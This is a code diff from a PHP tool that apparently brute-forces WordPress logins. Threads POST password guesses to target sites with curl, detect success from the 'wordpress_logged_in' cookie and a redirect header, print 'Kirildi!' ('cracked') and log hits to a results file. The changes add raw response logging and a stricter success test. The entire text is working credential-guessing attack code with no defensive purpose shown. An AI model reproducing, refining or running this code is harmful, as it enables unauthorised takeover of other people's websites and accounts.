@@ -12,7 +12,7 @@ error_reporting(0);
 
 *    Janissaries.Org
 
-*    wwww.Arsle.org
+*	 wwww.Arsle.org
 
 */
 class threadle extends Thread{
@@ -30,7 +30,7 @@ class threadle extends Thread{
 	public function run()
 	{
 		$yaz=fopen('sonuc.txt','a');
-		
+		$yenihata=fopen('yenihata.txt','w');
 		echo chr(27) . "[1;33m[$this->id][+]$this->site-->$this->sifre\n".chr(27) . "[0m";
 		$ch = curl_init();
 		curl_setopt ($ch, CURLOPT_URL,$this->site);
@@ -50,12 +50,12 @@ class threadle extends Thread{
 		curl_setopt ($ch, CURLOPT_POSTFIELDS, $this->postdata);
 		curl_setopt ($ch, CURLOPT_POST, 1);
 		$result = curl_exec ($ch);
-		
+		fwrite($yenihata,$result);
 		curl_close($ch);
 		
 		
 		
-		if((preg_match("/wordpress_logged_in/",$result) and !(preg_match("/deleted/",$result))))
+		if((preg_match("/wordpress_logged_in/",$result) && !(preg_match("/deleted/",$result)) && preg_match("/Location:/",$result)))
 		{
 			
 			echo chr(27) . "[0;32m" . "[$this->id][+]$this->site-->Kirildi!\n" . chr(27) . "[0m";
